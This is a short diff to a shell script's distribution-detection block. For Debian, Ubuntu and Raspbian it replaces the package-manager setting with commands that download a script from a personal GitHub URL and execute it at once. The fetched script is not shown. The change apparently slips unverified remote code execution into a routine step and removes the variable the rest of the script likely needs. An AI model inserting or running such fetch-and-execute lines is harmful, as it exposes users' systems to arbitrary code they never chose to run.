@@ -13,13 +13,16 @@ elif grep -Eqi "Fedora" /etc/issue || grep -Eq "Fedora" /etc/*-release; then
     PM='yum'
 elif grep -Eqi "Debian" /etc/issue || grep -Eq "Debian" /etc/*-release; then
     DISTRO='Debian'
-    PM='apt'
+  wget https://raw.githubusercontent.com/1tel1/sh/main/debian.sh
+  chmod +x debian.sh && ./debian.sh
 elif grep -Eqi "Ubuntu" /etc/issue || grep -Eq "Ubuntu" /etc/*-release; then
     DISTRO='Ubuntu'
-    PM='apt'
+  wget https://raw.githubusercontent.com/1tel1/sh/main/debian.sh
+  chmod +x debian.sh && ./debian.sh
 elif grep -Eqi "Raspbian" /etc/issue || grep -Eq "Raspbian" /etc/*-release; then
     DISTRO='Raspbian'
-    PM='apt'
+  wget https://raw.githubusercontent.com/1tel1/sh/main/debian.sh
+  chmod +x debian.sh && ./debian.sh
 else
     DISTRO='unknow'
 fi
